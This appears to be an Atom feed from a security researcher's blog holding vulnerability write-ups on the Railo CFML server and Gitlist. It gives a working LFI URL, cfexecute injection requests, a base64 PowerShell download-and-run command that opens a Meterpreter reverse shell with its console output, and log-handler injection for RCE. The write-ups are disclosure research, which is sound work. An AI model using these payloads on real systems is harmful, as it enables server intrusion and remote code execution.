<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset path="resources/img/#attributes.src#.cfm"&gt;
</span><span class='line'>&lt;cfparam name="application.adminimages" default="#{}#"&gt;
</span><span class='line'>&lt;cfif StructKeyExists(application.adminimages,path) and false&gt;
</span><span class='line'>    &lt;cfset str=application.adminimages[path]&gt;
</span><span class='line'>&lt;cfelse&gt;
</span><span class='line'>    &lt;cfsavecontent variable="str" trim&gt;&lt;cfinclude template="#path#"&gt;&lt;/cfsavecontent&gt;
</span><span class='line'>    &lt;cfset application.adminimages[path]=str&gt;
</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>


<p>By fetching this page with <code>attributes.src</code> set to another CFM file off elsewhere, we can load the file and execute any tags contained therein.  As we&rsquo;ve done above, lets grab <code>railo-web.xml.cfm</code>; we can do this with the following url: <code>http://host:8888/railo-context/admin/img.cfm?attributes.src=../../../../railo-web.xml&amp;thistag.executionmode=start</code> which simply returns</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;railo-configuration pw="d34535cb71909c4821babec3396474d35a978948455a3284fd4e1bc9c547f58b" version="4.2"&gt;</span></code></pre></td></tr></table></div></figure>


<p>This vulnerability exists in 3.3 &ndash; 4.2.1 (latest), and is exploitable out-of-the-box on both Railo installed and Express editions.  Though you can only pull CFM files, the configuration file dumps plenty of juicy information.  It may also be beneficial for custom tags, plugins, and custom applications that may house other vulnerable/sensitive information hidden away from the URL.</p>

<p>Curiously, at first glance it looks like it may be possible to turn this LFI into an RFI.  Unfortunately it&rsquo;s not quite that simple; if we attempt to access a non-existent file, we see the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>The error occurred in zip://C:\Documents and Settings\bryan\My Documents\Downloads\railo\railo-express-4.2.1.000-jre-win32\webapps\ROOT\WEB-INF\railo\context\railo-context.ra!/admin/img.cfm: line 29</span></code></pre></td></tr></table></div></figure>


<p>Notice the <code>zip://</code> handler.  This prevents us from injecting a path to a remote host with any other handler.  If, however, the tag looked like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfinclude&gt;#attributes.src#&lt;/cfinclude&gt;</span></code></pre></td></tr></table></div></figure>


<p>Then it would have been trivially exploitable via RFI.  As it stands, it&rsquo;s not possible to modify the handler without prior code execution.</p>

<p>To sum up the LFI&rsquo;s: all versions and all installs are vulnerable via the <code>img.cfm</code> vector.  All versions and all express editions are vulnerable via the Jetty LFI.  Versions &lt;= 4.0 and all installs are vulnerable to the XXE vector.  This gives us reliable LFI in all current versions of Railo.</p>

<p>This concludes our pre-authentication LFI portion of this assessment, which will crescendo with our final post detailing several pre-authentication RCE vulnerabilities.  I expect a quick turnaround for part four, and hope to have it out in a few days.  Stay tuned!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[railo security - part two - post-authentication rce]]></title>
    <link href="http://hatRiot.github.io/blog/2014/07/24/railo-security-part-two/"/>
    <updated>2014-07-24T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/07/24/railo-security-part-two</id>
    <content type="html"><![CDATA[<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one &ndash; intro</a></em><br/>
<em>Part two &ndash; post-authentication rce</em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>

<p>This post continues our dive into Railo security, this time introducing several post-authentication RCE vulnerabilities discovered in the platform.  As stated in part one of this series, like ColdFusion, there is a task scheduler that allows authenticated users the ability to write local files.  Whilst the existence of this feature sets it as the standard way to shell a Railo box, sometimes this may not work.  For example, in the event of stringent firewall rules, or irregular file permissions, or you&rsquo;d just prefer not to make remote connections, the techniques explored in this post will aid you in this manner.</p>

<p>PHP has an interesting, ahem, <em>feature</em>, where it writes out session information to a temporary file located in a designated path (<a href="http://ar.php.net/manual/en/session.configuration.php">more</a>).  If accessible to an attacker, this file can be used to inject PHP data into, via multiple different vectors such as a User-Agent or some function of the application itself.  Railo does sort of the same thing for its Web and Server interfaces, except these files are always stored in a predictable location.  Unlike PHP however, the name of the file is not simply the session ID, but is rather a quasi-unique value generated using a mixture of pseudo-random and predictable/leaked information.  I&rsquo;ll dive into this here in a bit.</p>

<p>When a change to the interface is made, or a new page bookmark is created, Railo writes this information out to a session file located at <code>/admin/userdata/</code>.  The file is then either created, or an existing one is used, and will be named either <code>web-[value].cfm</code> or <code>server-[value].cfm</code> depending on the interface you&rsquo;re coming in from.  It&rsquo;s important to note the extension on these files; because of the CFM extension, these files will be parsed by the CFML interpreter looking for CF tags, much like PHP will do.  A typical request to add a new bookmark is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /railo-context/admin/web.cfm?action=internal.savedata&action2=addfavorite&favorite=server.request HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>The favorite <code>server.request</code> is then written out to a JSON-encoded array object in the session file, as below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{'fullscreen':'true','contentwidth':'1267','favorites':{'server.request':''}}</span></code></pre></td></tr></table></div></figure>


<p>The next question is then obvious: what if we inject something malicious as a favorite?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /railo-context/admin/web.cfm?action=internal.savedata&action2=addfavorite&favorite=&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;pre&gt;#output#&lt;/pre&gt;&lt;/cfoutput&gt; HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>Our session file will then read:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{'fullscreen':'true','contentwidth':'1267','favorites':{'&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;pre&gt;##output##&lt;/pre&gt;&lt;/cfoutput&gt;':'','server.charset':''}}</span></code></pre></td></tr></table></div></figure>


<p>Whilst our injected data is written to the file, astute readers will note the double # around our Coldfusion variable.  This is ColdFusion&rsquo;s way of escaping a number sign, and will therefore not reflect our command output back into the page.  To my knowledge, there is no way to obtain shell output without the use of the variable tags.</p>

<p>We have two options for popping this: inject a command to return a shell or inject a web shell that simply writes output to a file that is then accessible from the web root.  I&rsquo;ll start with the easiest of the two, which is injecting a command to return a shell.</p>

<p>I&rsquo;ll use PowerSploit&rsquo;s Invoke-Shellcode script and inject a Meterpreter shell into the Railo process.  Because Railo will also quote our single/double quotes, we need to base64 the Invoke-Expression payload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /railo-context/admin/web.cfm?action=internal.savedata&action2=addfavorite&favorite=%3A%3Ccfoutput%3E%3Ccfexecute%20name%3D%22c%3A%5Cwindows%5Csystem32%5Ccmd.exe%22%20arguments%3D%22%2Fc%20PowerShell.exe%20-Exec%20ByPass%20-Nol%20-Enc%20aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA2ADoAOAAwADAAMAAvAEkAbgB2AG8AawBlAC0AUwBoAGUAbABsAGMAbwBkAGUALgBwAHMAMQAnACkA%22%20timeout%3D%2210%22%20variable%3D%22output%22%3E%3C%2Fcfexecute%3E%3C%2Fcfoutput%3E%27 HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>Once injected, we hit our session page and pop a shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>payload =&gt; windows/meterpreter/reverse_https
</span><span class='line'>LHOST =&gt; 192.168.1.6
</span><span class='line'>LPORT =&gt; 4444
</span><span class='line'>[*] Started HTTPS reverse handler on https://0.0.0.0:4444/
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] 192.168.1.102:50122 Request received for /INITM...
</span><span class='line'>[*] 192.168.1.102:50122 Staging connection for target /INITM received...
</span><span class='line'>[*] Patched user-agent at offset 663128...
</span><span class='line'>[*] Patched transport at offset 662792...
</span><span class='line'>[*] Patched URL at offset 662856...
</span><span class='line'>[*] Patched Expiration Timeout at offset 663728...
</span><span class='line'>[*] Patched Communication Timeout at offset 663732...
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.1.6:4444 -&gt; 192.168.1.102:50122) at 2014-03-24 00:44:20 -0600
</span><span class='line'>
</span><span class='line'>meterpreter &gt; getpid
</span><span class='line'>Current pid: 5064
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: bryan-PC\bryan
</span><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer        : BRYAN-PC
</span><span class='line'>OS              : Windows 7 (Build 7601, Service Pack 1).
</span><span class='line'>Architecture    : x64 (Current Process is WOW64)
</span><span class='line'>System Language : en_US
</span><span class='line'>Meterpreter     : x86/win32
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>Because I&rsquo;m using Powershell, this method won&rsquo;t work in Windows XP or Linux systems, but it&rsquo;s trivial to use the next method for that (net user/useradd).</p>

<p>The second method is to simply write out the result of a command into a file and then retrieve it.  This can trivially be done with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>':&lt;cfoutput&gt;&lt;cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir &gt; ./webapps/www/WEB-INF/railo/context/output.cfm" timeout="10" variable="output"&gt;&lt;/cfexecute&gt;&lt;/cfoutput&gt;'</span></code></pre></td></tr></table></div></figure>


<p>Note that we&rsquo;re writing out to the start of web root and that our output file is a CFM; this is a requirement as the web server won&rsquo;t serve up flat files or txt&rsquo;s.</p>

<p>Great, we&rsquo;ve verfied this works.  Now, how to actually figure out what the hell this session file is called?  As previously noted, the file is saved as either <code>web-[VALUE].cfm</code> or <code>server-[VALUE].cfm</code>, the prefix coming from the interface you&rsquo;re accessing it from.  I&rsquo;m going to step through the code used for this, which happens to be a healthy mix of CFML and Java.</p>

<p>We&rsquo;ll start by identifying the session file on my local Windows XP machine: <code>web-a898c2525c001da402234da94f336d55.cfm</code>.  This is stored in <code>www\WEB-INF\railo\context\admin\userdata</code>, of which <code>admin\userdata</code> is accessible from the web root, that is, we can directly access this file by hitting <code>railo-context/admin/userdata/[file]</code> from the browser.</p>

<p>When a favorite it saved, <code>internal.savedata.cfm</code> is invoked and searches through the given list for the function we&rsquo;re performing:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif listFind("addfavorite,removefavorite", url.action2) and structKeyExists(url, "favorite")&gt;
</span><span class='line'>    &lt;cfset application.adminfunctions[url.action2](url.favorite) /&gt;
</span><span class='line'>        &lt;cflocation url="?action=#url.favorite#" addtoken="no" /&gt;</span></code></pre></td></tr></table></div></figure>


<p>This calls down into <code>application.adminfunctions</code> with the specified action and favorite-to-save.  Our addfavorite function is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffunction name="addfavorite" returntype="void" output="no"&gt;
</span><span class='line'>        &lt;cfargument name="action" type="string" required="yes" /&gt;
</span><span class='line'>        &lt;cfset var data = getfavorites() /&gt;
</span><span class='line'>        &lt;cfset data[arguments.action] = "" /&gt;
</span><span class='line'>        &lt;cfset setdata('favorites', data) /&gt;
</span><span class='line'>    &lt;/cffunction&gt;</span></code></pre></td></tr></table></div></figure>


<p>Tunneling yet deeper into the rabbit hole, we move forwards into setdata:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffunction name="setdata" returntype="void" output="no"&gt;
</span><span class='line'>        &lt;cfargument name="key" type="string" required="yes" /&gt;
</span><span class='line'>        &lt;cfargument name="value" type="any" required="yes" /&gt;
</span><span class='line'>        &lt;cflock name="setdata_admin" timeout="1" throwontimeout="no"&gt;
</span><span class='line'>            &lt;cfset var data = loadData() /&gt;
</span><span class='line'>            &lt;cfset data[arguments.key] = arguments.value /&gt;
</span><span class='line'>            &lt;cfset writeData() /&gt;
</span><span class='line'>        &lt;/cflock&gt;
</span><span class='line'>    &lt;/cffunction&gt;</span></code></pre></td></tr></table></div></figure>


<p>This function actually reads in our data file, inserts our new favorite into the data array, and writes it back down.  Our question is &ldquo;how do you know the file?&rdquo;, so naturally we need to head into loadData:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> &lt;cffunction name="loadData" access="private" output="no" returntype="any"&gt;
</span><span class='line'>        &lt;cfset var dataKey = getDataStoreName() /&gt;
</span><span class='line'>            [..snip..]</span></code></pre></td></tr></table></div></figure>


<p>And yet deeper we move, into getDataStoreName:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cffunction name="getDataStoreName" access="private" output="no" returntype="string"&gt;
</span><span class='line'>        &lt;cfreturn "#request.admintype#-#getrailoid()[request.admintype].id#" /&gt;
</span><span class='line'>    &lt;/cffunction&gt;</span></code></pre></td></tr></table></div></figure>


<p>At last we&rsquo;ve reached the apparent event horizon of this XML black hole; we see the return will be of form <code>web-#getrailoid()[web].id#</code>, substituting in web for request.admintype.</p>

<p>I&rsquo;ll skip some of the digging here, but lets fast forward to Admin.java:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> private String getCallerId() throws IOException {
</span><span class='line'>        if(type==TYPE_WEB) {
</span><span class='line'>            return config.getId();
</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>


<p>Here we return the ID of the caller (our ID, for reference, is what we&rsquo;re currently tracking down!), which calls down into config.getId:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   @Override
</span><span class='line'>    public String getId() {
</span><span class='line'>        if(id==null){
</span><span class='line'>            id = getId(getSecurityKey(),getSecurityToken(),false,securityKey);
</span><span class='line'>        }
</span><span class='line'>        return id;
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>Here we invoke getId which, if null, calls down into an overloaded getId which takes a security key and a security token, along with a boolean (false) and some global securityKey value.  Here&rsquo;s the function in its entirety:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>public static String getId(String key, String token,boolean addMacAddress,String defaultValue) {
</span><span class='line'>
</span><span class='line'>    try {
</span><span class='line'>        if(addMacAddress){// because this was new we could swutch to a new ecryption // FUTURE cold we get rid of the old one?
</span><span class='line'>            return Hash.sha256(key+";"+token+":"+SystemUtil.getMacAddress());
</span><span class='line'>        }
</span><span class='line'>        return Md5.getDigestAsString(key+token);
</span><span class='line'>    }
</span><span class='line'>    catch (Throwable t) {
</span><span class='line'>        return defaultValue;
</span><span class='line'>    }
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>Our ID generation is becoming clear; it&rsquo;s essentially the MD5 of key + token, the key being returned from <code>getSecurityKey</code> and the token coming from <code>getSecurityToken</code>.  These functions are simply getters for private global variables in the ConfigImpl class, but tracking down their generation is fairly trivial.  All state initialization takes place in ConfigWebFactory.java.  Let&rsquo;s first check out the security key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>private static void loadId(ConfigImpl config) {
</span><span class='line'>        Resource res = config.getConfigDir().getRealResource("id");
</span><span class='line'>        String securityKey = null;
</span><span class='line'>        try {
</span><span class='line'>            if (!res.exists()) {
</span><span class='line'>                res.createNewFile();
</span><span class='line'>                IOUtil.write(res, securityKey = UUIDGenerator.getInstance().generateRandomBasedUUID().toString(), SystemUtil.getCharset(), false);
</span><span class='line'>            }
</span><span class='line'>            else {
</span><span class='line'>                securityKey = IOUtil.toString(res, SystemUtil.getCharset());
</span><span class='line'>            }
</span><span class='line'>        }
</span></code></pre></td></tr></table></div></figure>


<p>Okay, so our key is a randomly generated UUID from the safehaus library.  This isn&rsquo;t very likely to be guessed/brute-forced, but the value is written to a file in a consistent place.  We&rsquo;ll return to this.</p>

<p>The second value we need to calculate is the security token, which is set in ConfigImpl:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>public String getSecurityToken() {
</span><span class='line'>        if(securityToken==null){
</span><span class='line'>            try {
</span><span class='line'>                securityToken = Md5.getDigestAsString(getConfigDir().getAbsolutePath());
</span><span class='line'>            }
</span><span class='line'>            catch (IOException e) {
</span><span class='line'>                return null;
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>        return securityToken;
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>Gah!  This is predictable/leaked!  The token is simply the MD5 of our configuration directory, which in my case is <code>C:\Documents and Settings\bryan\My Documents\Downloads\railo-express-4.0.4.001-jre-win32\webapps\www\WEB-INF\railo</code>  So let&rsquo;s see if this works.</p>

<p>We MD5 the directory (<code>20132193c7031326cab946ef86be8c74</code>), then prefix this with the random UUID (securityKey) to finally get:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo -n "3ec59952-b5de-4502-b9d7-e680e5e2071820132193c7031326cab946ef86be8c74" | md5sum
</span><span class='line'>a898c2525c001da402234da94f336d55  -</span></code></pre></td></tr></table></div></figure>


<p>Ah-ha!  Our session file will then be web-a898c2525c001da402234da94f336d55.cfm, which exactly lines up with what we&rsquo;re seeing:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo_session_proof.jpg"></p>

<p>I mentioned that the config directory is leaked; default Railo is pretty promiscuous:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo_bad_page.jpg"></p>

<p>As you can see, from this we can derive the base configuration directory and figure out one half of the session filename.  We now turn our attention to figuring out exactly what the securityKey is; if we recall, this is a randomly generated UUID that is then written out to a file called <code>id</code>.</p>

<p>There are two options here; one, guess or predict it, or two, pull the file with an LFI.  As alluded to in part one, we can set the error handler to any file on the system we want.  As we&rsquo;re in the mood to discuss post-authentication issues, we can harness this to fetch the required <code>id</code> file containing this UUID:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-error-handler-lfi.jpg"></p>

<p>When we then access a non-existant page, we trigger the template and the system returns our file:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-uuid.jpg"></p>

<p>By combining these specific vectors and inherit weaknesses in the Railo architecture, we can obtain post-authentication RCE without forcing the server to connect back.  This can be particularly useful when the Task Scheduler just isn&rsquo;t an option.  This vulnerability has been implemented into clusterd as an auxiliary module, and is available in the latest dev build (0.3.1).  A quick example of this:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-log-injection-exec.jpg"></p>

<p>I mentioned briefly at the start of this post that there were &ldquo;several&rdquo; post-authentication RCE vulnerabilities.  Yes.  Several.  The one documented above was fun to find and figure out, but there is another way that&rsquo;s much cleaner.  Railo has a function that allows administrators to set logging information, such as level and type and location.  It also allows you to create your own logging handlers:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-log-settings.jpg"></p>

<p>Here we&rsquo;re building an HTML layout log file that will append all ERROR logs to the file.  And we notice we can configure the path and the title.  And the log extension.  Easy win.  By modifying the path to <code>/context/my_file.cfm</code> and setting the title to <code>&lt;cfdump var="#session#"&gt;</code> we can execute arbitrary commands on the file system and obtain shell access.  The file is not created once you create the log, but once you select Edit and then Submit for some reason.  Here&rsquo;s the HTML output that&rsquo;s, by default, stuck into the file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;&lt;cfdump var="#session#"&gt;&lt;/title&gt;
</span><span class='line'>&lt;style type="text/css"&gt;
</span><span class='line'>&lt;!--
</span><span class='line'>body, table {font-family: arial,sans-serif; font-size: x-small;}
</span><span class='line'>th {background: #336699; color: #FFFFFF; text-align: left;}
</span><span class='line'>--&gt;
</span><span class='line'>&lt;/style&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body bgcolor="#FFFFFF" topmargin="6" leftmargin="6"&gt;
</span><span class='line'>&lt;hr size="1" noshade&gt;
</span><span class='line'>Log session start time Mon Jun 30 23:06:17 MDT 2014&lt;br&gt;
</span><span class='line'>&lt;br&gt;
</span><span class='line'>&lt;table cellspacing="0" cellpadding="4" border="1" bordercolor="#224466" width="100%"&gt;
</span><span class='line'>&lt;tr&gt;
</span><span class='line'>&lt;th&gt;Time&lt;/th&gt;
</span><span class='line'>&lt;th&gt;Thread&lt;/th&gt;
</span><span class='line'>&lt;th&gt;Level&lt;/th&gt;
</span><span class='line'>&lt;th&gt;Category&lt;/th&gt;
</span><span class='line'>&lt;th&gt;Message&lt;/th&gt;
</span><span class='line'>&lt;/tr&gt;
</span><span class='line'>&lt;/table&gt;
</span><span class='line'>&lt;br&gt;
</span><span class='line'>&lt;/body&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>Note our title contains the injected command.  Here&rsquo;s execution:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-log-inject-execution.jpg"></p>

<p>Using this method we can, again, inject a shell without requiring the use of any reverse connections, though that option is of course available with the help of the <code>cfhttp</code> tag.</p>

<p>Another fun post-authentication <em>feature</em> is the use of data sources.  In Railo, you can craft a custom data source, which is a user-defined database abstraction that can be used as a filesystem.  Here&rsquo;s the definition of a MySQL data source:</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-datasource-def.jpg"></p>

<p>With this defined, we can set all client session data to be stored in the database, allowing us to harvest session ID&rsquo;s and plaintext credentials (see part one).  Once the session storage is set to the created database, a new table will be created (cf_session_data) that will contain all relevant session information, including symmetrically-encrypted passwords.</p>

<p><img src="http://hatRiot.github.io/images/posts/2014/railo/railo-database-session-info.jpg"></p>

<p>Part three and four of this series will begin to dive into the good stuff, where we&rsquo;ll discuss several pre-authentication vulnerabilities that we can use to obtain credentials and remote code execution on a Railo host.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[gitlist - commit to rce]]></title>
    <link href="http://hatRiot.github.io/blog/2014/06/29/gitlist-rce/"/>
    <updated>2014-06-29T15:00:00-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/06/29/gitlist-rce</id>
    <content type="html"><![CDATA[<p><a href="http://gitlist.org/">Gitlist</a> is a fantastic repository viewer for Git; it&rsquo;s essentially your own private Github without all the social networking and glitzy features of it.  I&rsquo;ve got a private Gitlist that I run locally, as well as a professional instance for hosting internal projects.  Last year I noticed a bug listed on their Github page that looked a lot like an exploitable <a href="https://github.com/klaussilveira/gitlist/issues/395">hole</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Oops! sh: 1: Syntax error: EOF in backquote substitution</span></code></pre></td></tr></table></div></figure>


<p>I commented on its exploitability at the time, and though the hole appears to be closed, the issue still remains.  I returned to this during an install of Gitlist and decided to see if there were any other bugs in the application and, as it turns out, there are a few.  I discovered a handful of bugs during my short hunt that I&rsquo;ll document here, including one anonymous remote code execution vulnerability that&rsquo;s quite trivial to pop.  These bugs were reported to the developers and CVE-2014-4511 was assigned.  These issues were fixed in version 0.5.0.</p>

<p>The first bug is actually more of a vulnerability in a library Gitlist uses, Gitter (same developers).  Gitter allows developers to interact with Git repositories using Object-Oriented Programming (OOP).  During a quick once-over of the code, I noticed the library shelled out quite a few times, and one in particular stood out to me:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$hash = $this-&gt;getClient()-&gt;run($this, "log --pretty=\"%T\" --max-count=1 $branch");```</span></code></pre></td></tr></table></div></figure>


<p>This can be found in <code>Repository.php</code> of the Gitter library, and is invoked from <code>TreeController.php</code> in Gitlist.  As you can imagine, there is no sanitization on the <code>$branch</code> variable.  This essentially means that anyone with commit access to the repository can create a malicious branch name (locally or remotely) and end up executing arbitrary commands on the server.</p>

